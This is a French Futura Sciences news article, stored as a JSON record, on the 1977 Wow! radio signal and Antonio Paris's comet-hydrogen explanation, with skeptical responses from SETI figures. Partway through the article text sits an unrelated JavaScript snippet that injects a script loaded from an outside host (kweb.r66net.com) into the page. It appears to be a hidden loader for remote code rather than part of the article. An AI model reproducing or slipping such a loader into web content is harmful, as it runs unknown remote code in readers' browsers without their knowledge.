{"title": "Le celebre signal Wow! etait-il d'origine E.T. ?", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-06-09", "content": "Le signal \"Wow!\" est un intriguant pic d'ondes radio detectees en 21 cm et dont on s'accorde a dire qu'il pourrait avoir ete emis par une civilisation E.T. Il y a du nouveau dans cette affaire. Selon les travaux de l'astronome Antonio Paris, ce signal aurait ete emis par une comete dont on ignorait l'existence en 1977. Ce qu'il faut retenir Le signal \"Wow!\" est un pic d'ondes radio dans une bande etroite centree sur la frequence de 1.420 megahertz, c'est-a-dire la ou se trouve la fameuse raie a 21 centimetres de l'hydrogene, capte en 1977 par le radiotelescope  Big Ear  du programme Seti.  Il y a de bonnes raisons de penser que c'est la frequence des communications interstellaires entre civilisations par ondes radio. Aucune interpretation convaincante du signal Wow! a partir d'un phenomene astronomique n'avait ete trouve. De nouvelles observations semblent accrediter l'hypothese que ce signal provenait en realite d'un nuage d'hydrogene entourant une comete. Il y a deux ans, le milliardaire d'origine russe Yuri Milner, soutenu par  Stephen Hawking  ainsi que Kip Thorne, le conseiller scientifique du film  Interstellar , Ann Druyan, la veuve de  Carl Sagan , faisait une annonce retentissante.  Via  le lancement du projet  Breakthrough Initiative , il allait financer le programme Seti a hauteur de 100 millions de dollars sur dix ans, donnant ainsi un coup de fouet a l'ecoute des signaux  radio  venus d'eventuelles civilisations extraterrestres. L'entreprise etait, et est toujours, difficile car la nature a plus d'un tour dans son sac comme semble nous le rappeler une recente publication dans le  Journal of the Washington Academy of Sciences , un periodique peu connu mais serieux dans lequel une dizaine de prix Nobel ont fait connaitre leurs travaux. Il ne s'agirait rien de moins qu'une solution a l'enigme du fameux signal << Wow! >> detecte en 1977 dans le cadre du  programme Seti  et qui etait considere depuis lors comme un cas credible de detection d'une communication provenant d'une civilisation E.T. technologiquement avancee.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Qu'est-ce que le signal \"Wow!\" ? Mais d'abord, rappelons quelques faits dont certains sont exposes dans la video ci-dessous. Au debut des annees 1960, on est en plein boum de la radioastronomie et des chercheurs ne vont pas tarder a decouvrir les  quasars , le  rayonnement fossile  et enfin les  pulsars . L'observatoire radio de l'universite d'Etat de l'Ohio, dont la construction a commence en 1956, entre en fonction en 1963. Ce grand  radiotelescope  est affectueusement baptise  Big Ear  (<< grande oreille >>, en anglais). Malheureusement, il perd son financement pour cartographier les sources radio une decennie plus tard. Il devient alors disponible pour faire de la recherche dans le cadre du  programme Seti , ce qu'il fera de 1973 a 1995 avant d'etre demantele en 1998. Une presentation du signal \"Wow!\". (c) AstronoGeek,  Le 15 aout 1977, c'est l'effervescence tres probablement dans l'esprit de l'astrophysicien Jerry R. Ehman alors qu'il depouille les donnees tout juste prises par  Big Ear . Elles montrent un brusque pic d'intensite etonnant dans une bande etroite centree sur la  frequence  de 1.420 megahertz, c'est-a-dire la ou se trouve la fameuse raie a 21 centimetres de l' hydrogene . Il y a de bonnes raisons de penser qu'elle est la frequence des communications interstellaires entre civilisations.  La source ne dure que 72 secondes et elle occupe une region de la voute celeste dans la  constellation  du Sagittaire, juste au nord-ouest de l' amas globulaire  M 55 (incidemment, on pense que les vieilles civilisations E.T. ont plus de chance de se trouver dans les  amas globulaires ). Le pic d'intensite decouvert par Ehman correspond bien a ce qu'on pourrait s'attendre si la  Terre  avait croise par inadvertance un faisceau d'ondes radio en provenance d'extra-terrestres. C'est pourquoi l'astrophysicien s'est empresse d'ecrire un << Wow! >> (une exclamation de surprise et d'admiration en anglais) en bordure de l'enregistrement sur papier qu'il tient dans sa main. Le signal << Wow! >>, comme on l'appelle, va marquer les esprits pendant 40 ans. Rien de semblable n'a ete detecte par la suite et aucune explication naturelle convaincante n'avait ete proposee...jusqu'en 2016. L'astronome Antonio Paris, du  Saint Petersburg College  en Floride, publie alors, et deja dans le  Journal of the Washington Academy of Sciences , une hypothese intrigante. Des nuages d'hydrogene emetteurs d'ondes radio autour des cometes ? Selon lui,  Big Ear  n'aurait fait que capter le signal produit par un nuage d'hydrogene lors du passage d'une  comete  non encore identifiee en 1977. Cet hydrogene serait issu de la photodissociation des  molecules  d'eau au plus proche du  Soleil . Il pense qu'il pourrait s'agir de 266P/Christensen ou P/2008 Y2 (Gibbs), toutes deux decouvertes a partir de 2006 et dont les ephemerides retro-predites dans le passe donnent des positions compatibles, selon lui, avec la position du signal Wow! de 1977. Surtout, l'hypothese de Paris etait testable car il est possible de tenter d'observer les  nuages  d'hydrogene produits par ces cometes. En utilisant le financement participatif, l'astronome a ainsi pu conduire une campagne de 200 observations avec un petit radiotelescope de 10 metre de diametre, entre le 27 novembre 2016 et le 24 fevrier 2017. Elle concernait la comete 266/P Christensen. Les resultats viennent d'etre publies dans  Journal of the Washington Academy of Sciences . Selon le chercheur, un signal a 1.420 megahertz a bien ete detecte dans une region d'un degre d'arc autour de la position de la comete. Signal qui disparaissait quand il pointait le radiotelescope hors de cette region, laquelle etait d'ailleurs centree sur la position du signal Wow! en 1977. Aucune autre source astronomique possible de ce signal n'etait presente dans une region de 15deg d'arc. En outre, Paris a observe trois autres cometes - P/2013 EW90 (Tenagra), P/2016 J1-A (Panstarrs) et 237P/Linear - autour desquelles son instrument a decouvert egalement des nuages d'hydrogene. Ingenieure, Elisabeth Piotelat est tres impliquee dans le programme Seti qu'elle represente en France. (c) Elisabeth Piotelat                               Affaire classee ? Est-ce la fin du dossier E.T. avec le signal Wow ? Peut-etre pas car Robert Dixon, qui a dirige le programme Seti avec  Big Ear,  n'est pas convaincu comme il vient de le faire savoir avec ses collegues dans une  mise au point . Il conteste le fait que 266/P Christensen ait vraiment occupe la position du signal Wow! dans le passe et aussi la detection d'hydrogene autour d'une comete. En tout etat de cause, Futura a demande l'avis de la representante en France de la  Seti League ,  Elisabeth Piotelat , sur cette affaire.  << Le signal \"Wow!\" est celebre depuis 1977 parce qu'a ce jour, aucune des hypotheses n'a pu etre verifiee, qu'il s'agisse d' interference  ou de signaux intelligents d'origine extraterrestre. L'article d'Antonio Paris est interessant car il ajoute une nouvelle hypothese, celle d'un nuage cometaire. Il ne repond pas a toutes les questions du signal Wow!, comme par exemple le probleme du rapport signal sur bruit. Wow! en avait un qui etait beaucoup plus fort (un rapport de 30). Antonio Paris explique cela par la qualite du radiotelescope Big Ear qui n'est pas comparable avec l'antenne de 10 m qu'il a utilisee.  Quoi qu'il en soit, si ce signal n'avait pas ete aussi celebre, il aurait sans doute ete oublie. Depuis toujours, les projets Seti invitent scientifiques et citoyens a se poser des questions, a emettre des hypotheses pour une meilleure connaissance de l' univers . Meme si nous sommes seuls dans l'univers, nous n'aurons pas tout perdu ! >>  conclut-elle. ", "theme": "sciences"}